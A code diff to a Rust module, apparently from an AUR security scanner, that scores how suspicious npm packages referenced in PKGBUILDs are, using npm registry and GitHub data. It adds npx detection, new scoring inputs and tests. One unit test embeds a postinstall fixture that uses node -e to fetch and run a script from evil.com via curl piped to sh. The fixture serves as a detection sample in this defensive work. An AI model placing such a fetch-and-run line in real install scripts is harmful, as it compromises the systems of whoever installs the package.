@@ -1,3 +1,20 @@
+//! NPM package legitimacy verification.
+//!
+//! # Pipeline
+//!
+//! 1. **Detection** — regex match in PKGBUILD for npm/yarn/npx commands or
+//!    `registry.npmjs.org` tarball URLs (see `extract_npm_package_name`).
+//! 2. **Fetch** — query `registry.npmjs.org/<pkg>` for scripts, maintainers,
+//!    repo URL, creation time.
+//! 3. **Deep-inspect** — if a GitHub repo is linked, fetch stars, forks,
+//!    README size, and closed-issues count.
+//! 4. **Score** — all fields feed into `scoring::npm_suspicion_risk()`, which
+//!    computes the four-component NPM Suspicion Score with the formula:
+//!
+//!    S_npm = min(Rmax, Σ Wi·fi(x) + Ω)
+//!
+//!    See `scoring.rs` for the mathematics.
+
 use crate::shared::models::{NpmPackageInfo, NpmScripts};
 use regex::Regex;
 use serde::Deserialize;
@@ -9,15 +26,32 @@ static NPM_PKG_NAME_RE: LazyLock<Regex> = LazyLock::new(|| {
     Regex::new(r#"registry\.npmjs\.org/(@?[\w.-]+(?:/[@\w][\w.-]*)?)"#).unwrap()
 });
 
-/// Match npm/yarn/npx commands with a specific package
+/// Match npm/yarn/npx commands with a specific package.
+///
+/// Uses `[ \t]+` (NOT `\s+`) to prevent matching across newlines — `\s`
+/// matches `\n` in Rust's regex crate, which would greedily consume line
+/// breaks and capture words from the next line as a false package name.
 static NPM_INSTALL_RE: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r#"(npm|yarn)\s+(install|add)\s+(-g\s+)?['"]?(@?[\w@./-]+)"#).unwrap()
+    Regex::new(r#"(npm|yarn)\s+(install|add)[ \t]+(-g[ \t]+)?['"]?(@?[\w@./-]+)"#).unwrap()
+});
+
+/// Match `npx <package>` commands and extract the package name.
+///
+/// Examples: `npx electron-builder build ...` → captures `electron-builder`.
+/// Flags between npx and the package (e.g. `npx --yes foo`) are handled
+/// by matching the first non-flag word token.
+static NPX_EXEC_RE: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r#"npx[ \t]+(?:--?[^\s]+[ \t]+)*['"]?([@\w][\w@./-]*)"#).unwrap()
 });
 
 /// GitHub repo URL extractor (reused logic from github.rs).
 static GITHUB_URL_RE: LazyLock<Regex> = LazyLock::new(|| {
     Regex::new(r#"(?i)github\.com/([^/\s]+)/([^/\s#?.]+)"#).unwrap()
 });
+
+// ────────────────────────────────────────────
+// Deserialization structs for NPM registry API
+// ────────────────────────────────────────────
 
 #[derive(Deserialize)]
 struct NpmRegistryPackage {
@@ -61,8 +95,16 @@ struct NpmTime {
     created: Option<String>,
 }
 
+// ──────────────────────────────────────────────────────────
+// Public entry point: fetch_npm_info
+// ──────────────────────────────────────────────────────────
+
 /// Fetch NPM package metadata if the PKGBUILD references an npm package.
-/// Extracts package name from npm registry URLs or npm install commands.
+///
+/// Extracts package name from npm registry URLs or npm install commands,
+/// then queries the npm registry for scripts/maintainers/repo, and finally
+/// deep-inspects the linked GitHub repo (if any) for stars, forks, README
+/// size, and closed-issues count.
 pub fn fetch_npm_info(pkgbuild_content: &str) -> Option<NpmPackageInfo> {
     let package_name = extract_npm_package_name(pkgbuild_content)?;
     let registry_data = fetch_registry_data(&package_name)?;
@@ -78,27 +120,47 @@ pub fn fetch_npm_info(pkgbuild_content: &str) -> Option<NpmPackageInfo> {
     let scripts = registry_data.scripts.unwrap_or_default();
 
     let mut info = NpmPackageInfo {
+        package_name: package_name.clone(),
         scripts,
         maintainer_account_age: account_age,
         maintainer_package_count: maintainer_count,
         github_repo_exists: false,
         github_stars: 0,
         github_commit_freshness: 365, // conservative default
+        github_forks: 0,
+        github_closed_issues: 0,
+        github_readme_bytes: 0,
     };
 
-    // If npm package has a GitHub repo, fetch GitHub stats
+    // If npm package has a GitHub repo, fetch deep-inspection stats
     if let Some(ref repo_url) = repo_url {
         if let Some((owner, repo)) = parse_github_url(repo_url) {
-            if let Some(gh_info) = fetch_github_stats(&owner, &repo) {
-                info.github_repo_exists = gh_info.found;
-                info.github_stars = gh_info.stars;
-                info.github_commit_freshness = gh_info.days_since_last_commit;
+            let clean_repo = repo.trim_end_matches(".git");
+
+            // Fetch repo overview (stars, forks, last push)
+            if let Some(gh) = fetch_github_stats(&owner, clean_repo) {
+                info.github_repo_exists = gh.found;
+                info.github_stars = gh.stars;
+                info.github_commit_freshness = gh.days_since_last_commit;
+                info.github_forks = gh.forks;
             }
+
+            // Fetch README size (independent of repo overview)
+            info.github_readme_bytes =
+                fetch_github_readme_size(&owner, clean_repo).unwrap_or(0);
+
+            // Fetch closed issues count (best-effort; search API may rate-limit)
+            info.github_closed_issues =
+                fetch_github_closed_issues(&owner, clean_repo).unwrap_or(0);
         }
     }
 
     Some(info)
 }
+
+// ──────────────────────────────────────────────────────────
+// Package name extraction from PKGBUILD
+// ──────────────────────────────────────────────────────────
 
 /// Extract npm package name from PKGBUILD content.
 fn extract_npm_package_name(content: &str) -> Option<String> {
@@ -128,8 +190,32 @@ fn extract_npm_package_name(content: &str) -> Option<String> {
         }
     }
 
+    // Try npx <package> commands (e.g. `npx electron-builder build ...`)
+    if let Some(caps) = NPX_EXEC_RE.captures(content) {
+        let pkg = caps[1].to_string();
+        // Filter out common shell keywords that can appear after bare `npm install`
+        // with newline-matching (legacy safety, though [ \t]+ now prevents this)
+        if !is_shell_keyword(&pkg) && !pkg.is_empty() {
+            return Some(pkg);
+        }
+    }
+
     None
 }
+
+/// Returns true if the word looks like a shell keyword or common false positive
+/// (safety net for regex edge cases).
+fn is_shell_keyword(word: &str) -> bool {
+    matches!(
+        word,
+        "if" | "then" | "else" | "elif" | "fi" | "do" | "done"
+            | "for" | "while" | "in" | "case" | "esac" | "function"
+    )
+}
+
+// ──────────────────────────────────────────────────────────
+// NPM registry API
+// ──────────────────────────────────────────────────────────
 
 /// Fetch package metadata from npm registry.
 fn fetch_registry_data(package_name: &str) -> Option<NpmRegistryPackage> {
@@ -150,6 +236,171 @@ fn fetch_registry_data(package_name: &str) -> Option<NpmRegistryPackage> {
 
     resp.json().ok()
 }
+
+// ──────────────────────────────────────────────────────────
+// GitHub API: repo overview (stars, forks, last push)
+// ──────────────────────────────────────────────────────────
+
+/// Aggregated GitHub stats for an npm package's linked repository.
+struct GitHubNpmStats {
+    stars: u32,
+    forks: u32,
+    found: bool,
+    days_since_last_commit: u32,
+}
+
+/// Fetch repo overview from GitHub API.
+fn fetch_github_stats(owner: &str, repo: &str) -> Option<GitHubNpmStats> {
+    let api_url = format!("https://api.github.com/repos/{owner}/{repo}");
+
+    let client = reqwest::blocking::Client::new();
+    let mut request = client
+        .get(&api_url)
+        .header("User-Agent", "traur")
+        .header("Accept", "application/vnd.github.v3+json");
+
+    if let Ok(token) = std::env::var("GITHUB_TOKEN") {
+        if !token.is_empty() {
+            request = request.header("Authorization", format!("Bearer {token}"));
+        }
+    }
+
+    let resp = request
+        .timeout(std::time::Duration::from_secs(10))
+        .send()
+        .ok()?;
+
+    if resp.status() == 404 {
+        return Some(GitHubNpmStats {
+            stars: 0,
+            forks: 0,
+            found: false,
+            days_since_last_commit: 365,
+        });
+    }
+
+    if !resp.status().is_success() {
+        return None;
+    }
+
+    #[derive(Deserialize)]
+    struct GhResponse {
+        stargazers_count: u32,
+        forks_count: u32,
+        pushed_at: Option<String>,
+    }
+
+    let gh: GhResponse = resp.json().ok()?;
+
+    let days_since = gh
+        .pushed_at
+        .as_deref()
+        .and_then(|s| chrono_like_parse(s).ok())
+        .map(|ts| {
+            let now = std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .unwrap()
+                .as_secs() as i64;
+            (now.saturating_sub(ts) / 86400) as u32
+        })
+        .unwrap_or(365);
+
+    Some(GitHubNpmStats {
+        stars: gh.stargazers_count,
+        forks: gh.forks_count,
+        found: true,
+        days_since_last_commit: days_since,
+    })
+}
+
+// ──────────────────────────────────────────────────────────
+// GitHub API: closed issues count (for f_bot interactions)
+// ──────────────────────────────────────────────────────────
+
+/// Fetch closed issues count via GitHub search API.
+///
+/// Uses `GET /search/issues?q=repo:owner/repo+type:issue+state:closed&per_page=1`
+/// to get just the `total_count` without fetching actual issue bodies.
+/// Returns `None` on failure (network, rate-limit, etc.) — callers treat
+/// this as zero.
+fn fetch_github_closed_issues(owner: &str, repo: &str) -> Option<u32> {
+    let query = format!("repo:{owner}/{repo}+type:issue+state:closed");
+    let url = format!("https://api.github.com/search/issues?q={query}&per_page=1");
+
+    let client = reqwest::blocking::Client::new();
+    let mut request = client
+        .get(&url)
+        .header("User-Agent", "traur")
+        .header("Accept", "application/vnd.github.v3+json");
+
+    if let Ok(token) = std::env::var("GITHUB_TOKEN") {
+        if !token.is_empty() {
+            request = request.header("Authorization", format!("Bearer {token}"));
+        }
+    }
+
+    let resp = request
+        .timeout(std::time::Duration::from_secs(10))
+        .send()
+        .ok()?;
+
+    if !resp.status().is_success() {
+        return None;
+    }
+
+    #[derive(Deserialize)]
+    struct SearchResponse {
+        total_count: u32,
+    }
+
+    let result: SearchResponse = resp.json().ok()?;
+    Some(result.total_count)
+}
+
+// ──────────────────────────────────────────────────────────
+// GitHub API: README size (for f_doc documentation risk)
+// ──────────────────────────────────────────────────────────
+
+/// Fetch README size in bytes from GitHub.
+///
+/// Calls `GET /repos/owner/repo/readme` which returns JSON with a `size`
+/// field (bytes). Returns `None` on failure (e.g., no README, private repo).
+fn fetch_github_readme_size(owner: &str, repo: &str) -> Option<u32> {
+    let url = format!("https://api.github.com/repos/{owner}/{repo}/readme");
+
+    let client = reqwest::blocking::Client::new();
+    let mut request = client
+        .get(&url)
+        .header("User-Agent", "traur")
+        .header("Accept", "application/vnd.github.v3+json");
+
+    if let Ok(token) = std::env::var("GITHUB_TOKEN") {
+        if !token.is_empty() {
+            request = request.header("Authorization", format!("Bearer {token}"));
+        }
+    }
+
+    let resp = request
+        .timeout(std::time::Duration::from_secs(10))
+        .send()
+        .ok()?;
+
+    if !resp.status().is_success() {
+        return None;
+    }
+
+    #[derive(Deserialize)]
+    struct ReadmeResponse {
+        size: u32,
+    }
+
+    let result: ReadmeResponse = resp.json().ok()?;
+    Some(result.size)
+}
+
+// ──────────────────────────────────────────────────────────
+// Helpers
+// ──────────────────────────────────────────────────────────
 
 /// Compute maintainer account age from package creation time.
 fn compute_account_age(data: &NpmRegistryPackage) -> u32 {
@@ -208,84 +459,21 @@ fn days_from_civil(y: i32, m: u32, d: u32) -> i32 {
     era * 146097 + doe - 719468
 }
 
-/// GitHub stats fetched for npm package's repository.
-struct GitHubNpmStats {
-    stars: u32,
-    found: bool,
-    days_since_last_commit: u32,
-}
-
-/// Fetch GitHub repo stats for NPM package repository URL.
-fn fetch_github_stats(owner: &str, repo: &str) -> Option<GitHubNpmStats> {
-    let clean_repo = repo.trim_end_matches(".git");
-    let api_url = format!("https://api.github.com/repos/{owner}/{clean_repo}");
-
-    let client = reqwest::blocking::Client::new();
-    let mut request = client
-        .get(&api_url)
-        .header("User-Agent", "traur")
-        .header("Accept", "application/vnd.github.v3+json");
-
-    if let Ok(token) = std::env::var("GITHUB_TOKEN") {
-        if !token.is_empty() {
-            request = request.header("Authorization", format!("Bearer {token}"));
-        }
-    }
-
-    let resp = request
-        .timeout(std::time::Duration::from_secs(10))
-        .send()
-        .ok()?;
-
-    if resp.status() == 404 {
-        return Some(GitHubNpmStats {
-            stars: 0,
-            found: false,
-            days_since_last_commit: 365,
-        });
-    }
-
-    if !resp.status().is_success() {
-        return None;
-    }
-
-    #[derive(Deserialize)]
-    struct GhResponse {
-        stargazers_count: u32,
-        pushed_at: Option<String>,
-    }
-
-    let gh: GhResponse = resp.json().ok()?;
-
-    let days_since = gh
-        .pushed_at
-        .as_deref()
-        .and_then(|s| chrono_like_parse(s).ok())
-        .map(|ts| {
-            let now = std::time::SystemTime::now()
-                .duration_since(std::time::UNIX_EPOCH)
-                .unwrap()
-                .as_secs() as i64;
-            (now.saturating_sub(ts) / 86400) as u32
-        })
-        .unwrap_or(365);
-
-    Some(GitHubNpmStats {
-        stars: gh.stargazers_count,
-        found: true,
-        days_since_last_commit: days_since,
-    })
-}
-
 /// Parse GitHub URL to owner/repo.
 fn parse_github_url(url: &str) -> Option<(String, String)> {
     let caps = GITHUB_URL_RE.captures(url)?;
     Some((caps[1].to_string(), caps[2].to_string()))
 }
 
+// ──────────────────────────────────────────────────────────
+// Tests
+// ──────────────────────────────────────────────────────────
+
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    // --- package name extraction ---
 
     #[test]
     fn extracts_package_from_registry_url() {
@@ -321,6 +509,105 @@ mod tests {
     }
 
     #[test]
+    fn bare_npm_install_no_package_name() {
+        // `npm install` without a package name installs from package.json;
+        // there is no specific npm package to check.
+        let content = "npm_config_cache=\"${srcdir}/cache\" npm install";
+        assert!(
+            extract_npm_package_name(content).is_none(),
+            "Bare `npm install` with no package name should return None"
+        );
+    }
+
+    #[test]
+    fn bare_npm_install_alone_no_npx_returns_none() {
+        // When only `npm install` exists (no npx, no registry URL),
+        // the function should return None.
+        let content = r#"
+build() {
+  cd "${srcdir}/${pkgname}-${pkgver}"
+  npm install
+  npm run build
+}
+"#;
+        assert!(
+            extract_npm_package_name(content).is_none(),
+            "`npm install` + `npm run` without npx or registry URL should return None"
+        );
+    }
+
+    #[test]
+    fn bare_npm_install_no_crossline_match() {
+        // The regex must NOT cross newlines and capture `if` from the next line.
+        // It SHOULD find the `npx electron-builder` on a later line.
+        let content = r#"npm install
+  if [[ ${CARCH} == "aarch64" ]]; then
+    npx electron-builder build --arm64 --linux dir
+  fi"#;
+        assert_eq!(
+            extract_npm_package_name(content).as_deref(),
+            Some("electron-builder"),
+            "Should find npx package on later line, not `if` from cross-line match"
+        );
+    }
+
+    #[test]
+    fn extracts_from_npx_command() {
+        let content = "npx electron-builder build --arm64 --linux dir";
+        assert_eq!(
+            extract_npm_package_name(content).as_deref(),
+            Some("electron-builder"),
+            "npx <pkg> should extract the package name"
+        );
+    }
+
+    #[test]
+    fn extracts_from_npx_with_flags() {
+        let content = "npx --yes --package typescript tsc --version";
+        assert_eq!(
+            extract_npm_package_name(content).as_deref(),
+            Some("typescript"),
+            "npx with flags should skip flags and capture the package name"
+        );
+    }
+
+    #[test]
+    fn npx_shell_keywords_ignored() {
+        // Safety net: even if a regex bug matches `npx if`, shell keywords
+        // are filtered out by is_shell_keyword().
+        assert!(is_shell_keyword("if"));
+        assert!(is_shell_keyword("then"));
+        assert!(!is_shell_keyword("electron-builder"));
+    }
+
+    /// Real-world test: teams-for-linux PKGBUILD uses `npm install` (bare, no
+    /// package name) and `npx electron-builder`. The bare `npm install` must
+    /// NOT cross the newline and capture `if` as a package name.
+    #[test]
+    fn teams_for_linux_npm_extraction() {
+        let content = r#"
+build() {
+  cd "${srcdir}/${pkgname}-${pkgver}"
+  npm_config_cache="${srcdir}/package-cache" npm install
+  if [[ ${CARCH} == "aarch64" ]]; then
+    npx electron-builder build --arm64 --linux dir
+  elif [[ ${CARCH} == "armv7h" ]]; then
+    npx electron-builder build --armv7l --linux dir
+  elif [[ ${CARCH} == "i686" ]]; then
+    npx electron-builder build --ia32 --linux dir
+  elif [[ ${CARCH} == "x86_64" ]]; then
+    npx electron-builder build --x64 --linux dir
+  fi
+}
+"#;
+        assert_eq!(
+            extract_npm_package_name(content).as_deref(),
+            Some("electron-builder"),
+            "Should extract package from npx, not match `if` across newline from bare npm install"
+        );
+    }
+
+    #[test]
     fn iso_parse() {
         let ts = chrono_like_parse("2024-01-15T10:30:00Z").unwrap();
         // Jan 15, 2024 = day 738900 from epoch approximately
@@ -353,26 +640,67 @@ package() {
         );
     }
 
-    /// Verify npm_suspicion_risk catches the classic `node -e` obfuscated payload
-    /// pattern commonly used in compromised NPM packages.
+    // --- npm_suspicion_risk (in scoring.rs) smoke tests via npm_info ---
+
+    /// Obfuscated `node -e` postinstall script in a package from a burner
+    /// account: should max out the NPM suspicion score.
     #[test]
     fn suspicious_postinstall_node_eval() {
-        let info = crate::shared::models::NpmPackageInfo {
-            scripts: crate::shared::models::NpmScripts {
-                preinstall: String::new(),
-                install: String::new(),
-                postinstall: "node -e \"require('child_process').exec('curl -s http://evil.com/x|sh')\"".to_string(),
-            },
-            maintainer_account_age: 15,
-            maintainer_package_count: 1,
-            github_repo_exists: false,
-            github_stars: 0,
-            github_commit_freshness: 365,
-        };
+        let info = test_npm_info_builder()
+            .postinstall("node -e \"require('child_process').exec('curl -s http://evil.com/x|sh')\"")
+            .account_age(15)
+            .package_count(1)
+            .no_repo()
+            .build();
         let risk = crate::shared::scoring::npm_suspicion_risk(&info);
-        // 25 (suspicious cmd) + 10 (age<90) + 5 (single pkg) + 10 (no repo) = 50, capped at 30
-        assert_eq!(risk, 30, "Obfuscated node -e postinstall with new maintainer should max out NPM suspicion risk");
+        // Omega (critical payload) = 30 → S_npm = min(30, Σ Wi·fi + 30) = 30
+        assert_eq!(
+            risk, 30,
+            "Critical payload (node -e subshell exec) should max out at 30"
+        );
     }
+
+    /// Legitimate NPM package with no scripts, established maintainer, and
+    /// a well-maintained GitHub repo.
+    #[test]
+    fn npm_suspicion_clean_package_zero() {
+        let info = test_npm_info_builder()
+            .install("node-gyp rebuild")
+            .account_age(365)
+            .package_count(5)
+            .stars(100)
+            .forks(20)
+            .closed_issues(50)
+            .readme_bytes(2000)
+            .commit_freshness(10)
+            .build();
+        let risk = crate::shared::scoring::npm_suspicion_risk(&info);
+        // No suspicious scripts (Ω=0), high interactions, old account, README exists → near zero
+        assert!(risk < 5, "Clean npm package should have risk < 5, got {risk}");
+    }
+
+    /// No README, no stars, no interactions, burner account: botting + doc risk.
+    #[test]
+    fn npm_suspicion_burner_package() {
+        let info = test_npm_info_builder()
+            .account_age(5)
+            .package_count(1)
+            .no_repo()
+            .build();
+        let risk = crate::shared::scoring::npm_suspicion_risk(&info);
+        // Ω=0 (no scripts), but f_bot≈1, f_doc=1, f_auth≈0.89
+        // 15*1 + 5*1 + 10*0.89 ≈ 28.9
+        assert!(
+            risk > 20,
+            "Burner package with no README should have risk > 20, got {risk}"
+        );
+        assert!(
+            risk <= 30,
+            "Risk should be capped at 30, got {risk}"
+        );
+    }
+
+    // --- integration tests (network) ---
 
     /// Integration test: fetch real `atomic-lockfile` from npm registry.
     /// This was the payload package in the 2026-06-12 AUR attack wave.
@@ -390,6 +718,9 @@ package() {
         eprintln!("  maintainer_package_count: {}", info.maintainer_package_count);
         eprintln!("  github_repo_exists: {}", info.github_repo_exists);
         eprintln!("  github_stars: {}", info.github_stars);
+        eprintln!("  github_forks: {}", info.github_forks);
+        eprintln!("  github_closed_issues: {}", info.github_closed_issues);
+        eprintln!("  github_readme_bytes: {}", info.github_readme_bytes);
         eprintln!("  scripts.preinstall: {:?}", info.scripts.preinstall);
         eprintln!("  scripts.install: {:?}", info.scripts.install);
         eprintln!("  scripts.postinstall: {:?}", info.scripts.postinstall);
@@ -421,11 +752,92 @@ package() {
         eprintln!("  maintainer_package_count: {}", info.maintainer_package_count);
         eprintln!("  github_repo_exists: {}", info.github_repo_exists);
         eprintln!("  github_stars: {}", info.github_stars);
-        eprintln!("  scripts.preinstall: {:?}", info.scripts.preinstall);
-        eprintln!("  scripts.install: {:?}", info.scripts.install);
-        eprintln!("  scripts.postinstall: {:?}", info.scripts.postinstall);
+        eprintln!("  github_forks: {}", info.github_forks);
+        eprintln!("  github_readme_bytes: {}", info.github_readme_bytes);
 
         assert!(info.github_repo_exists, "minimist should have a GitHub repo");
         assert!(info.github_stars > 0, "minimist should have GitHub stars");
+    }
+
+    // --- test builder for constructing NpmPackageInfo in unit tests ---
+
+    struct TestNpmInfo {
+        info: NpmPackageInfo,
+    }
+
+    impl TestNpmInfo {
+        fn build(self) -> NpmPackageInfo {
+            self.info
+        }
+
+        fn postinstall(mut self, s: &str) -> Self {
+            self.info.scripts.postinstall = s.to_string();
+            self
+        }
+
+        fn install(mut self, s: &str) -> Self {
+            self.info.scripts.install = s.to_string();
+            self
+        }
+
+        fn account_age(mut self, days: u32) -> Self {
+            self.info.maintainer_account_age = days;
+            self
+        }
+
+        fn package_count(mut self, n: u32) -> Self {
+            self.info.maintainer_package_count = n;
+            self
+        }
+
+        fn no_repo(mut self) -> Self {
+            self.info.github_repo_exists = false;
+            self.info.github_readme_bytes = 0;
+            self.info.github_closed_issues = 0;
+            self
+        }
+
+        fn stars(mut self, n: u32) -> Self {
+            self.info.github_repo_exists = true;
+            self.info.github_stars = n;
+            self
+        }
+
+        fn forks(mut self, n: u32) -> Self {
+            self.info.github_forks = n;
+            self
+        }
+
+        fn closed_issues(mut self, n: u32) -> Self {
+            self.info.github_closed_issues = n;
+            self
+        }
+
+        fn readme_bytes(mut self, n: u32) -> Self {
+            self.info.github_readme_bytes = n;
+            self
+        }
+
+        fn commit_freshness(mut self, days: u32) -> Self {
+            self.info.github_commit_freshness = days;
+            self
+        }
+    }
+
+    fn test_npm_info_builder() -> TestNpmInfo {
+        TestNpmInfo {
+            info: NpmPackageInfo {
+                package_name: "test-pkg".to_string(),
+                scripts: NpmScripts::default(),
+                maintainer_account_age: 365,
+                maintainer_package_count: 5,
+                github_repo_exists: true,
+                github_stars: 100,
+                github_commit_freshness: 30,
+                github_forks: 10,
+                github_closed_issues: 20,
+                github_readme_bytes: 500,
+            },
+        }
     }
 }
